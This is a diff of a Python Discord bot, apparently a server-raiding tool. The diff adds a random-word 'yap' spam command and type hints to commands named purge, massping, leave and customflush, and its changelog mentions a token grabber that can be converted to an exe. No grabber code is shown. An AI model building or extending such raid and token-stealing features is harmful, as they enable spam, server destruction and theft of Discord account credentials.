@@ -14,17 +14,19 @@ import subprocess
 import praw
 from config import TOKEN
 from utils.tokeninfo import tokeninfo
+from utils.shitlist import en, zh, ru, allat
 from discord.ext import commands
 from discord.ui import Select
 
 
 
 
-# ================                Bithub v0.2              ================ # 
+# ================                Bithub v0.02              ================ # 
 # ++++++++++++++++               S. 10/17/2023              ++++++++++++++++ #
 
 
                 # ================ changelog ================ # 
+                # add sum lil shit
                 # made help look better
                 # added convert token grabber file to exe
                 # added ip info                
@@ -49,13 +51,14 @@ from discord.ui import Select
                 # add emojis
                 # change every thing to embeds
                 # add convert to exe in token grabber
+                # turn everything to slash cmd
                 # ================ to do list ================ # 
 
 
 
 
 
-YOURUSERID = ''
+YOURUSERID = '992952207588720730'
 DMONREADY = "FALSE"
 
 
@@ -554,7 +557,7 @@ async def customflush(ctx, server_id, channel_amount, channel_name, message_amou
         await ctx.reply(embed=embxdd)
         
 @bot.command()
-async def purge(ctx, server_id=None):
+async def purge(ctx, server_id: int = None):
     if server_id is None:
         server_id = ctx.guild.id
     try:
@@ -573,7 +576,7 @@ async def purge(ctx, server_id=None):
 
 
 @bot.command()
-async def leave(ctx, server_id=None):
+async def leave(ctx, server_id: int = None):
     if server_id is None:
         server_id = ctx.guild.id
     guild = bot.get_guild(int(server_id))
@@ -626,7 +629,7 @@ async def servlist(ctx):
     await ctx.send(f"Server list:\n{server_list}")
 
 @bot.command()
-async def massping(ctx, server_id=None, message_amount: int = 5, *, message_content: str = ""):
+async def massping(ctx, server_id: int = None, message_amount: int = 5, *, message_content: str = ""):
     if server_id is None:
         server_id = ctx.guild.id
     guild = bot.get_guild(server_id)
@@ -969,6 +972,32 @@ async def shitpost(ctx, source="dankmemes"):
 
     await ctx.send(embed=embed)
 
+@bot.command()
+async def yap(ctx, len=150, lang="en"):
+    global en
+    global zh
+    global ru
+    global allat
+    if lang == "en":
+        rw = random.sample(en, len)
+        rwj = ' '.join(rw)
+        await ctx.send(rwj)
+    elif lang == "zh":
+        rwx = random.sample(zh, len)
+        rwxj = ' '.join(rwx)
+        await ctx.send(rwxj)
+    elif lang == "ru":
+        rwxzr = random.sample(ru, len)
+        rwxjzr = ' '.join(rwxzr)
+        await ctx.send(rwxjzr)
+    elif lang == "all":
+        rwxz = random.sample(allat, len)
+        rwxjz = ' '.join(rwxz)
+        await ctx.send(rwxjz)
+    else:
+        await ctx.reply("Invalid language.")
+
+
 
 @bot.command()
 async def help(ctx):
@@ -1000,7 +1029,7 @@ async def help(ctx):
             description=""),
         discord.SelectOption(
             label="Shit",
-            emoji="🤡", 
+            emoji="💩", 
             description=""),
         discord.SelectOption(
             label="Github",
@@ -1083,6 +1112,7 @@ async def help(ctx):
         if select.values[0] == "Shit":
             xembed = discord.Embed(title='Info', color=discord.Color.dark_magenta())
             xembed.add_field(name='💩 Shitpost', value=f'Random post from reddit\n`{bot.command_prefix}shitpost <subreddit>`', inline=False)
+            xembed.add_field(name='🦜 Yap', value=f'Say something interesting\n`{bot.command_prefix}yap <length> <lang: en/zh/all>`', inline=False)
             xembed.set_footer(text="Github: x9o")
 
             await interaction.response.send_message(embed=xembed, ephemeral=True)
@@ -1223,6 +1253,8 @@ color_codes = [
     "0x8B008B",
     "0x556B2F",
 ]
+
+
 
 
         
